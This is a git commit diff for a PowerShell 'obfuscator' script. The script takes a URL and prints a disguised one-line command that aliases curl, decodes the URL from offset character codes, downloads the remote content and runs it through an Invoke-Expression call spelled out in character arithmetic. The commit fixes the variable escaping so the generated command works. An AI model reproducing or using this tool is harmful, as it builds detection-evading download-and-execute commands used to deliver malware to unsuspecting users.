6b35c35f9912ac018c35f69fe599c0ab6ab70cc5
fkxdr <fkxdr@proton.me>
2024-09-18 18:57:33 +0200

    Update obfuscator.ps1

--- obfuscator.ps1
+++ obfuscator.ps1
@@ -1,6 +1,6 @@
 Write-Host "ps1-obfuscator by fkxdr"
 $url = Read-Host "`nEnter URL to obfuscate"
-Write-Host "`nGenerating script...`n"
+Write-Host "`nGenerating command...`n"
 
 function Generate-RandomName($length) {
     $chars = "abcdefghijklmnopqrstuvwxyz"
@@ -18,12 +18,14 @@ function Obfuscate-Url($inputUrl) {
 }
 
 $obfuscatedArray = Obfuscate-Url $url
-$randomVarName1 = Generate-RandomName 5
-$randomVarName2 = Generate-RandomName 5
-$aliasName = Generate-RandomName 5
+$randomVarName1 = Generate-RandomName(5)
+$randomVarName2 = Generate-RandomName(5)
+$aliasName = Generate-RandomName(5)
 
+# Correctly escaping $ to ensure that the generated script works as expected
 $obfuscatedScript = @"
-powershell -Command `"new-alias $aliasName curl; `$randomVarName1 = @($($obfuscatedArray -join ',')); `$randomVarName2 = ''; foreach (`$asciiValue in `$randomVarName1) { `$decodedChar=[char](`$asciiValue-8787); `$randomVarName2+=`$decodedChar; }; .([char](9992-9887)+'e'+'x')($aliasName -useb `$randomVarName2)`"
+powershell -Command `"new-alias $aliasName curl; `$$randomVarName1 = @($($obfuscatedArray -join ',')); `$$randomVarName2 = ''; foreach (`$asciiValue in `$$randomVarName1) { `$decodedChar=[char](`$asciiValue-8787); `$$randomVarName2+=`$decodedChar; }; .([char](9992-9887)+'e'+'x')($aliasName -useb `$$randomVarName2)`"
 "@
 
+# Output the obfuscated script for copying and pasting
 Write-Host $obfuscatedScript
